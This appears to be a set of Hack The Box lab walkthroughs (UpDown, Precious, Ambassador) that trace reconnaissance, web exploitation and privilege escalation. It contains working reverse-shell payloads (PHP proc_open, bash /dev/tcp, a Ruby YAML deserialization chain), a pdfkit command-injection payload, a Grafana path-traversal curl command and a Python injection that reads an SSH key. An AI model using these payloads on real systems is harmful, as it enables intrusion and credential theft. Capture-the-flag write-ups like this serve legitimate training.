entry.title: UpDown
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.177 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p22,80 10.10.11.177 -Pn

-> All ports scan:

Nmap scan report for 10.10.11.177Host is up, received user-set (0.050s latency).Scanned at 2022-12-15 12:22:36 EST for 13sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63

-> All ports scan with flags:

PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Is my Website up ?|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Services

TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.177 22
  • output:
    └─$ nc -nv 10.10.11.177 22                                           (UNKNOWN) [10.10.11.177] 22 (ssh) open

-> SSH key fingerprint:

ssh root@10.10.11.177
  • output:
    └─$ ssh root@10.10.11.177The authenticity of host '10.10.11.177 (10.10.11.177)' can't be established.RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
TCP 80 ( Default port for HTTP )

We can see that we have a vhost present in the web page, so let’s add it to our /etc/hosts file:

echo "10.10.11.177    siteisup.htb" >> /etc/hosts

-> Web Server:

HTTP/1.1 200 OKDate: Thu, 15 Dec 2022 17:26:50 GMTServer: Apache/2.4.41 (Ubuntu)Vary: Accept-EncodingContent-Length: 1131Content-Type: text/html; charset=UTF-8<!DOCTYPE html><html>  <head>    <meta charset='utf-8' />    <meta http-equiv="X-UA-Compatible" content="chrome=1" />    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">    <title>Is my Website up ?</title>  </head>  <body>    <div id="header_wrap" class="outer">        <header class="inner">          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>          <h2 id="project_tagline">Here you can check if your website is up or down.</h2>        </header>    </div>

-> whatweb:

└─$ whatweb http://10.10.11.177/    http://10.10.11.177/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.177], Title[Is my Website up ?], X-UA-Compatible[chrome=1]

-> Directory Listing:

gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

-> output:

└─$ gobuster dir -u http://siteisup.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://siteisup.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2022/12/15 12:28:49 Starting gobuster in directory enumeration mode===============================================================/.php                 (Status: 403) [Size: 277]/.html                (Status: 403) [Size: 277]/.html.php            (Status: 403) [Size: 277]/index.php            (Status: 200) [Size: 1131]/.htm.php             (Status: 403) [Size: 277] /.htm                 (Status: 403) [Size: 277] /dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]/.                    (Status: 200) [Size: 1131]                              /.htaccess            (Status: 403) [Size: 277]                               /.htaccess.php        (Status: 403) [Size: 277]                               /.phtml               (Status: 403) [Size: 277]                               /.htc                 (Status: 403) [Size: 277]                               /.htc.php             (Status: 403) [Size: 277]                               /.html_var_DE         (Status: 403) [Size: 277]                               /.html_var_DE.php     (Status: 403) [Size: 277]

The /dev/ endpoint is empty but if we continue with the enumeration and use gobuster on the /dev/ endpoint we will find that there is a misconfiguration and the .git folder is leaked.

gobuster dir -u http://siteisup.htb/dev/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://siteisup.htb/dev/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2022/12/15 12:30:11 Starting gobuster in directory enumeration mode===============================================================[...]/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]

We can use a tool called git-dumper in order to retrieve the .git folder.
Using git log –online we can see all the git logs:

There is a interesting log that could potentially contain some sensitive informations, so in order to view it we need to use:

└─$ git show 8812785commit 8812785e31c879261050e72e20f298ae8c43b565Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>Date:   Wed Oct 20 16:38:54 2021 +0200    New technique in header to protect our dev vhost.diff --git a/.htaccess b/.htaccessindex 44ff240..b317ab5 100644--- a/.htaccess+++ b/.htaccess@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header Order Deny,Allow Deny from All Allow from env=Required-Header

This is telling us that it will allow the connections from the “users” that have the Special-Dev header with the value of only4dev.
But we saw that on the http://siteisup.htb/ everything is fine without this header.
So there must be another vhost / subdomain.

└─$ wfuzz -u http://siteisup.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.siteisup.htb' --hw 93********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://siteisup.htb/Total requests: 4989=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    =====================================================================000000019:   403        9 L      28 W       281 Ch      "dev"

So let’s add this too to our /etc/hosts file.

echo "10.10.11.177    siteisup.htb dev.siteisup.htb" >> /etc/hosts

Now in order to be able to access this web server we need to set the special header so we could use an extension, we could use BurpSuite and many more options.
But in this case I used a Firefox extension called Modify Header Value by Milen, Linder

This is how the web server is looking now.
Running a gobuster scan against this we can see we have a /uploads folder and a /admin.php endpoint:

└─$ gobuster dir -u http://dev.siteisup.htb/ -H "Special-Dev: only4dev" -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://dev.siteisup.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2022/12/15 12:50:23 Starting gobuster in directory enumeration mode===============================================================/.html                (Status: 403) [Size: 281]/admin.php            (Status: 200) [Size: 0]   **/.html.php            (Status: 403) [Size: 281]/.php                 (Status: 403) [Size: 281]/index.php            (Status: 200) [Size: 1220] **/.htm                 (Status: 403) [Size: 281] /.htm.php             (Status: 403) [Size: 281] /uploads              (Status: 301) [Size: 322] [--> http://dev.siteisup.htb/uploads/] **

We can see we have a button to Admin Panel, by clicking it we can see that contents of the “admin” page:

But nothing is interesting here.
So going back to the main page of the web server we can see that now we are able to scan a list of websites:

So now we could use a tool called GitKraken in order to view the git logs easier but I will use the CLI.

└─$ git show f67efd0 commit f67efd00c10784ae75bd251add3d52af50d7adddAuthor: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>Date:   Wed Oct 20 18:33:11 2021 +0200    Create checker.phpdiff --git a/checker.php b/checker.phpnew file mode 100644index 0000000..aa9aa44--- /dev/null+++ b/checker.php@@ -0,0 +1,116 @@+<?php+if(DIRECTACCESS){+       die("Access Denied");+}+?>+<!DOCTYPE html>+<html>++  <head>+    <meta charset='utf-8' />+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">+    <title>Is my Website up ? (beta version)</title>+  </head>++  <body>++    <div id="header_wrap" class="outer">+        <header class="inner">+          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>+          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>+        </header>+    </div>++    <div id="main_content_wrap" class="outer">+      <section id="main_content" class="inner">+        <form method="post" enctype="multipart/form-data">+                           <label>List of websites to check:</label><br><br>+                               <input type="file" name="file" size="50">+                               <input name="check" type="submit" value="Check">+               </form>++<?php++function isitup($url){+       $ch=curl_init();+                               <input name="check" type="submit" value="Check">+               </form>++<?php++function isitup($url){+       $ch=curl_init();+       curl_setopt($ch, CURLOPT_URL, trim($url));+       curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");+       curl_setopt($ch, CURLOPT_HEADER, 1);+       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);+       curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);+       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);+       curl_setopt($ch, CURLOPT_TIMEOUT, 30);+       $f = curl_exec($ch);+       $header = curl_getinfo($ch);+       if($f AND $header['http_code'] == 200){+               return array(true,$f);+       }else{+               return false;+       }+    curl_close($ch);+}++if($_POST['check']){+  +       # File size must be less than 10kb.+       if ($_FILES['file']['size'] > 10000) {+        die("File too large!");+  }+       $file = $_FILES['file']['name'];+       +if($_POST['check']){+  +       # File size must be less than 10kb.+       if ($_FILES['file']['size'] > 10000) {+        die("File too large!");+  }+       $file = $_FILES['file']['name'];+       +       # Check if extension is allowed.+       $ext = getExtension($file);+       if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){+               die("Extension not allowed!");+       }+  +       # Create directory to upload our file.+       $dir = "uploads/".md5(time())."/";+       if(!is_dir($dir)){+        mkdir($dir, 0770, true);+  }+  +  # Upload the file.+       $final_path = $dir.$file;+       move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

We can see that it’s checking for those extensions and if it’s the case we will get an error.
But luckily it’s not checking for phar files.
So we will create a file with a list of websites and at the end of it we will inject our php code.

http://localhost/[...]<?php phpinfo(); ?>

After we submit the file we have a limited amount of time before it will get erased so we need to be quick.

We can see that we have successfully inject the phpinfo() code.
But now it’s the problem that we have a lot of disabled functions that we cannot use.
So in order to get a reverse shell we need to find a function that it’s not disabled and use it to get a reverse shell.

To find what function we can use we could use ChatGPT to make it funnier

Or you could use the classic proc_open in order to do that:

<?php$descriptorspec = array(   0 => array("pipe", "r"),   1 => array("pipe", "w"),   2 => array("file", "/tmp/error-output.txt", "a"));$cwd = '/tmp';$env = array('some_option' => 'aeiou');$process = proc_open('bash', $descriptorspec, $pipes, $cwd, $env);if (is_resource($process)) {    fwrite($pipes[0], 'bash -i >& /dev/tcp/IP/PORT 0>&1');    fclose($pipes[0]);    fclose($pipes[1]);}?>

Using this we can see that we have successfully got a reverse shell:

Privilege Escalation

Information Gathering ( Operating System )

www-data@updown:/home/developer$ cat /etc/*-releasecat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=20.04DISTRIB_CODENAME=focalDISTRIB_DESCRIPTION="Ubuntu 20.04.5 LTS"NAME="Ubuntu"VERSION="20.04.5 LTS (Focal Fossa)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 20.04.5 LTS"VERSION_ID="20.04"HOME_URL="https://www.ubuntu.com/"SUPPORT_URL="https://help.ubuntu.com/"BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"VERSION_CODENAME=focalUBUNTU_CODENAME=focal

Now that we know something about the box we could try to find SUID binaries using linpeas or with a simple command:

www-data@updown:/home/developer$ find / -perm -4000 2>/dev/null | grep -v usrfind / -perm -4000 2>/dev/null | grep -v usr/home/developer/dev/siteisup

We can see that this binary is owned by developer, so that means that if we manage to get a privesc on it we will be able to do commands as the user developer

www-data@updown:/home/developer/dev$ ls -lahls -lahtotal 32Kdrwxr-x--- 2 developer www-data  4.0K Jun 22 15:45 .drwxr-xr-x 6 developer developer 4.0K Aug 30 11:24 ..-rwsr-x--- 1 developer www-data   17K Jun 22 15:45 siteisup-rwxr-x--- 1 developer www-data   154 Jun 22 15:45 siteisup_test.pywww-data@updown:/home/developer/dev$ cat siteisup_test.pycat siteisup_test.pyimport requestsurl = input("Enter URL here:")page = requests.get(url)if page.status_code == 200:        print "Website is up"else:        print "Website is down"

We can see that it’s using input(), we can easily bypass this using:

__import__('os').system('cat /home/developer/.ssh/id_rsa')

And we can see that we have successfully retrieved developer’s ssh key.

developer@updown:~$ id && hostname && ip addruid=1002(developer) gid=1002(developer) groups=1002(developer)updown1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:50:56:b9:db:a6 brd ff:ff:ff:ff:ff:ff    inet 10.10.11.177/23 brd 10.10.11.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 dead:beef::250:56ff:feb9:dba6/64 scope global dynamic mngtmpaddr        valid_lft 86394sec preferred_lft 14394sec    inet6 fe80::250:56ff:feb9:dba6/64 scope link        valid_lft forever preferred_lft forever

Now we will need to start again with our enumeration but now that we are a normal user we can try the basic privesc command’s before doing anything:

developer@updown:~$ sudo -lMatching Defaults entries for developer on localhost:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser developer may run the following commands on localhost:    (ALL) NOPASSWD: /usr/local/bin/easy_install

Using sudo -l we can see that developer can run the easy_install script as any user he wants, that means that we can potentially get a shell as root
Looking on what easy_install is we have found out that it’s designed to facilitate packaging Python projects by enhancing the Python standard library distutils.

And we got root this easy, always remember the enumeration process is the most important.

entry.title: Precious
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.189 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p22,80 10.10.11.189 -Pn

-> All ports scan:

Nmap scan report for 10.10.11.189Host is up, received user-set (0.046s latency).Scanned at 2022-12-14 18:42:21 EST for 12sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63

-> All ports scan with flags:

└─$ nmap -A -sC -sV -p22,80 10.10.11.189 -PnStarting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 18:42 ESTNmap scan report for 10.10.11.189Host is up (0.047s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: |   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)80/tcp open  http    nginx 1.18.0|_http-title: Did not follow redirect to http://precious.htb/|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Services

TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.189 22
  • output:
    └─$ nc -nv 10.10.11.189 22                                           (UNKNOWN) [10.10.11.189] 22 (ssh) open

-> SSH key fingerprint:

ssh root@10.10.11.189
  • output:
    └─$ ssh root10.10.11.189The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
TCP 80 ( Default port for HTTP )

We can see that the NMAP reveal us the vhost of the machine: http://precious.htb/
So we will add this to our /etc/hosts file.

└─$ sudo cat /etc/hosts127.0.0.1       localhost127.0.1.1       kali10.10.11.189    precious.htb

-> Web Server:

-> curl:

└─$ curl -i http://precious.htb                         HTTP/1.1 200 OKContent-Type: text/html;charset=utf-8Content-Length: 483Connection: keep-aliveStatus: 200 OKX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffX-Frame-Options: SAMEORIGINDate: Wed, 14 Dec 2022 23:45:26 GMTX-Powered-By: Phusion Passenger(R) 6.0.15Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15X-Runtime: Ruby<!DOCTYPE html><html><head>    <title>Convert Web Page to PDF</title>    <link rel="stylesheet" href="stylesheets/style.css"></head><body>    <div class="wrapper">        <h1 class="title">Convert Web Page to PDF</h1>        <form action="/" method="post">            <p>Enter URL to fetch</p><br>            <input type="text" name="url" value="">            <input type="submit" value="Submit">        </form>        <h2 class="msg"></h2>    </div> </body></html>

-> whatweb:

└─$ whatweb http://precious.htbhttp://precious.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]

-> Directory Listing:

gobuster dir -u http://precious.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Using the gobuster command we can see that we have no output for it so we need to continue manually with our enumeration.

Trying to create a http server using python, we can see that it will convert our web page to a PDF, so most probably we need to find a way to bypass this into a RCE.

└─$ exiftool w4y0360nim2lc3zqyo2lu8sdif7yb9bj.pdf ExifTool Version Number         : 12.42File Name                       : w4y0360nim2lc3zqyo2lu8sdif7yb9bj.pdfDirectory                       : .File Size                       : 10 kBFile Modification Date/Time     : 2022:12:14 18:56:47-05:00File Access Date/Time           : 2022:12:14 18:56:55-05:00File Inode Change Date/Time     : 2022:12:14 18:56:52-05:00File Permissions                : -rw-r--r--File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Creator                         : **Generated by pdfkit v0.8.6**

We can see that it’s using pdfkit v0.8.6 that it’s vulnerable to Command Injection ( CVE-2022-25765 )
With that in mind we can try to craft our own webserver that exploits this vulnerability.

http://IP:PORT/?name=#{'%20`sleep 5`'}

Using this payload we can see that it’s sleeping for 5 secs before trying to download the pdf file.
Trying a bash reverse shell successfully gives us a tty shell:

bash -c 'exec sh -i >& /dev/tcp/10.10.15.3/443 0>&1'

-> reverse shell:

Now that we have user access and the port 22 for SSH is present, we could try to get a better reverse shell by copying our id_rsa.pub file into the ruby‘s .ssh folder.

Privilege Escalation

Information Gathering ( Operating System )

ruby@precious:~$ id && hostname && cat /etc/*-releaseuid=1001(ruby) gid=1001(ruby) groups=1001(ruby)preciousPRETTY_NAME="Debian GNU/Linux 11 (bullseye)"NAME="Debian GNU/Linux"VERSION_ID="11"VERSION="11 (bullseye)"VERSION_CODENAME=bullseyeID=debianHOME_URL="https://www.debian.org/"SUPPORT_URL="https://www.debian.org/support"BUG_REPORT_URL="https://bugs.debian.org/"

Looking through ruby‘s files we can see that in the home directory a folder called .bundle is present.
Inside we can see a configuration file for the BUNDLE_HTTPS that contains a username and a password:

ruby@precious:~/.bundle$ cat config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

With this password we can change our user to henry by using:

su - henry # and provide the password we extracted from the config file

Now that we know the password of the user henry we can use the command sudo -l to find out what henry can run:

henry@precious:~$ sudo -lMatching Defaults entries for henry on precious:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser henry may run the following commands on precious:    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

Looking on the update_dependencies.rb file we can see that it’s loading dependencies using YAML.load for a file called dependencies.yml
With that in our mind we could try to do a ruby yaml deserialization attack

---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &1 !ruby/object:Net::BufferedIO      io: &1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: "abc"      debug_output: &1 !ruby/object:Net::WriteAdapter         socket: &1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: "bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"         method_id: :resolve

Also we can see that it’s doing so we don’t need to do a path injection attack because the path it’s relative and not absolute.

YAML.load([...](dependencies.yml))`

Doing the exploit we can see that we have successfully got a reverse shell:

entry.title: Ambassador
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.183 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p22,80,3000,3306 10.10.11.183 -Pn

-> All ports scan:

Not shown: 65531 closed tcp ports (reset)PORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63

-> All ports scan with flags:

PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Ambassador Development Server|_http-generator: Hugo 0.94.2|_http-server-header: Apache/2.4.41 (Ubuntu)3000/tcp open  ppp?| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.0 302 Found|     Cache-Control: no-cache|     Content-Type: text/html; charset=utf-8|     Expires: -1|     Location: /login|     Pragma: no-cache|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax|     X-Content-Type-Options: nosniff|     X-Frame-Options: deny|     X-Xss-Protection: 1; mode=block|     Date: Thu, 08 Dec 2022 10:53:42 GMT|     Content-Length: 29|     href="/login">Found</a>.|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 400 Bad Request|     Content-Type: text/plain; charset=utf-8|     Connection: close|     Request|   GetRequest: |     HTTP/1.0 302 Found|     Cache-Control: no-cache|     Content-Type: text/html; charset=utf-8|     Expires: -1|     Location: /login|     Pragma: no-cache|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax|     X-Content-Type-Options: nosniff|     X-Frame-Options: deny|     X-Xss-Protection: 1; mode=block|     Date: Thu, 08 Dec 2022 10:53:11 GMT|     Content-Length: 29|     href="/login">Found</a>.|   HTTPOptions: |     HTTP/1.0 302 Found|     Cache-Control: no-cache|     Expires: -1|     Location: /login|     Pragma: no-cache|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax|     X-Content-Type-Options: nosniff|     X-Frame-Options: deny|     X-Xss-Protection: 1; mode=block|     Date: Thu, 08 Dec 2022 10:53:17 GMT|_    Content-Length: 03306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2| mysql-info: |   Protocol: 10|   Version: 8.0.30-0ubuntu0.20.04.2|   Thread ID: 44|   Capabilities flags: 65535|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongPassword, FoundRows, ODBCClient, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins|   Status: Autocommit|   Salt: F\x01"=| >c?C*Z\x0C\x0E\x01F#<y4\x7F|_  Auth Plugin Name: caching_sha2_password

Services

TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.183 22
  • output:
    └─$ nc -nv 10.10.11.183 22                                           (UNKNOWN) [10.10.11.183] 22 (ssh) open

-> SSH key fingerprint:

ssh root@10.10.11.183
  • output:
    └─$ ssh root@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
TCP 80 ( Default port for HTTP )

-> Web Server:

└─$ curl -i http://10.10.11.183/ | head -n 30HTTP/1.1 200 OKDate: Thu, 08 Dec 2022 10:56:40 GMTServer: Apache/2.4.41 (Ubuntu)Last-Modified: Fri, 02 Sep 2022 01:37:04 GMTETag: "e46-5e7a7c4652f79"Accept-Ranges: bytesContent-Length: 3654Vary: Accept-EncodingContent-Type: text/html<!DOCTYPE html><html lang="en-us">  <head>    <meta charset="utf-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    <title>Ambassador Development Server</title>    <meta name="viewport" content="width=device-width,minimum-scale=1">    <meta name="description" content="">    <meta name="generator" content="Hugo 0.94.2" />    <meta name="robots" content="noindex, nofollow">

-> Directory Listing:

gobuster dir -u http://10.10.11.183/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

-> output:

└─$ gobuster dir -u http://10.10.11.183/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.183/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2022/12/08 05:57:55 Starting gobuster in directory enumeration mode===============================================================/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]     /tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/]

Using manual enumeration we can see that on the posts page we found some potential SSH credentials.

This is the only thing that’s interesting so we will keep enumerating the rest of the ports.

PORT 3000 ( Default port for PPP )

Looking manually on this port we can see that it’s hosting a Grafana webserver with the version ( v8.2.0 )
Searching for this online or with searchsploit we can see that it’s vulnerable to directory traversal.

Running the script we can see that we have successfully extracted the /etc/passwd file:

Copying the file to our localhost we can see that the only user with ssh access is developer

└─$ cat etc_passwd.txt| grep -i "sh$" --color=autoroot:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bash

Knowing that this is a Grafana we can try to extract it’s database.
Path:

/var/lib/grafana/grafana.db

And in order to extract it we will use curl to make our lives easier.

curl -s --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

Looking through the database we can see that we have found the credentials for mysql and some other pair of credentials. 

2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-08 05:06:13|0|{}|1|uKewFgM4z
PORT 3306 ( Default port for MySQL )
└─$ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!    Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MySQL connection id is 51Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MySQL [(none)]> show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0.052 sec)MySQL [(none)]>

After looking manually through the databases we can see that the database called whackywidget contains some interesting table and information

